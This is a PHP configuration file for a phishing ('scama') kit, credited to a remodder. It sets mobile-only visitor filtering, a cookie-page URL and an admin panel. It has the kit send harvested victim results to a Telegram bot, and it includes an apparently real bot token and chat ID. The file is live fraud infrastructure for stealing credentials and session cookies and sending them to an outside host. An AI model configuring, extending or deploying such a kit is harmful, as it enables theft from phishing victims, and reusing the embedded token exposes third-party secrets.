<?php
###########################################################################################################

/*
TOGGLE ON / OFF:
1 : ENABLE.
0 : DISABLE.
USE 1 OR 0 to SET FEATURES ON OR OFF*/

$mailurl = ''; # url to the cookie page
$mobileonly             = 1; # <--- BLOCK ALL DEVICES THAT ARE NOT MOBILE
$sendtotg               = 1; # <--- SEND RESULTS TO TELEGRAM
$tgbot                  = "5374837971:AAELqpH5dsFDPtZDsXfC_Wf9-oI5Mdix6Gg"; # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
$chatid                 = "-682870777"; # <--- YOUR TELEGRAM CHAT ID






#Don't Touch 

$adminpanel = 1;
$adminpass  = "";


#;
#; ████████╗██╗  ██╗██╗   ██╗███████╗███████╗ ██████╗
#; ╚══██╔══╝██║  ██║╚██╗ ██╔╝██╔════╝██╔════╝██╔════╝
#;    ██║   ███████║ ╚████╔╝ ███████╗█████╗  ██║     
#;    ██║   ██╔══██║  ╚██╔╝  ╚════██║██╔══╝  ██║     
#;    ██║   ██║  ██║   ██║   ███████║███████╗╚██████╗
#;    ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝ ╚═════╝
#;
# <------- Remod @ThyOnecy<></>

# <-------  SCAMA CONFIGURATION FILE <></>
?>